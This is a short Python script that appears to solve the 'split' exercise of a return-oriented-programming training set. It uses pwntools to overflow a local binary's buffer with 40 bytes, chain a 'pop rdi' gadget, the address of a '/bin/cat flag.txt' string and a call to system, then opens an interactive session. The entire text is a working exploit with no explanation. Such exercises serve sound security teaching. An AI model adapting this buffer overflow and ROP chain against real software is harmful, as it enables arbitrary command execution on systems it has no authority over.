from pwn import *

p = process('./split')

payload = b'A' * 40
payload += p64(0x00000000004007c3)      # pop rdi ; ret
payload += p64(0x00601060)              # /bin/cat flag.txt
payload += p64(0x000000000040074b)      # system

p.sendlineafter(b'Contriving a reason to ask user for data...\n> ', payload)
p.interactive()
